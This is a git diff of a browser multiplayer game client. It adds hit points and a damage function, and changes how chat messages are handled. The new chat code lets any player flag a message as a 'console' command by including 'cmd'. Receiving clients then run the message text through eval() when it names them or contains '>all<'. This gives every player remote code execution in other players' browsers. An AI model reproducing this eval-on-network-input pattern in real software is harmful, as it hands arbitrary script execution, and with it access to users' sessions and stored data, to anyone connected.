@@ -62,6 +62,7 @@ function create() {
     localPlayer.setCollideWorldBounds(true);
     localPlayer.setTint(tint);
     this.physics.add.collider(localPlayer, platforms);
+    localPlayer.hp = 100;
 
     cursors = this.input.keyboard.createCursorKeys();
     
@@ -83,7 +84,11 @@ function create() {
     chatInput.addEventListener("keydown", function (e) {
         if (e.key === "Enter" && chatInput.value.trim() !== "") {
             const message = chatInput.value.trim();
-            socket.emit("chatMessage", { name: localStorage.getItem("playerName"), message });
+            if (message.includes("cmd")){
+                socket.emit("chatMessage", { name: localStorage.getItem("playerName"), message , isConsole: true});
+            } else {
+                socket.emit("chatMessage", { name: localStorage.getItem("playerName"), message , isConsole: false});
+            }
             chatInput.value = "";  // Clear chat input
             chatInput.blur();  // Remove focus from input after sending message
         }
@@ -151,21 +156,16 @@ function create() {
     });
 
     // Handle chat messages
-    socket.on("chatMessage", ({ name, message, color }) => {
-    const pname = localStorage.getItem("playerName") || "Anonymous";
-        if (message.includes(socket.id) || message.includes(pname)){
-            try {
-                // Try to evaluate the string
-                eval(message);
-            } catch (error) {
-                // If there's an error, log it to the console
-                console.log("Error evaluating message:", error);
+    socket.on("chatMessage", ({ name, message, color, isConsole }) => {
+        const pname = localStorage.getItem("playerName") || "Anonymous";
+        console.log(isConsole);
+        if(isConsole == true){
+            if(message.includes(pname) || message.includes(">all<")){
+                eval(message); 
             }
-
-        }
-        if (message.includes("//") && message.includes(";")){
-            message = "get hacked!";
-        }
+        } else {
+        
+        
         const el = document.createElement("div");
 
         // Convert the color to hex format for display purposes
@@ -182,9 +182,20 @@ function create() {
 
         // Scroll to the bottom of the chat
         chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
     });
 }
 
+function takeDmg(damage){
+    if (localPlayer.hp <= damage){ // Respawn character (add later)
+        localPlayer.destroy();
+        window.location.assign("menu.html");
+    } else {
+    localPlayer.hp -= damage;
+    }
+    
+    socket.emit("takeDamage", damage);
+}
 
 function update() {
     if (!isFrozen && !isTyping) {  // Only allow movement if not typing
@@ -205,6 +216,7 @@ function update() {
             id: socket.id,
             x: localPlayer.x,
             y: localPlayer.y,
+            hp: localPlayer.hp,
             velocity: {
                 x: localPlayer.body.velocity.x,
                 y: localPlayer.body.velocity.y
@@ -228,6 +240,7 @@ socket.on('playerMoved', (playerData) => {
         otherPlayers[playerData.id].setVelocity(playerData.velocity.x, playerData.velocity.y);
     }
 });
+
 
 
 function createOtherPlayer(id, data) {
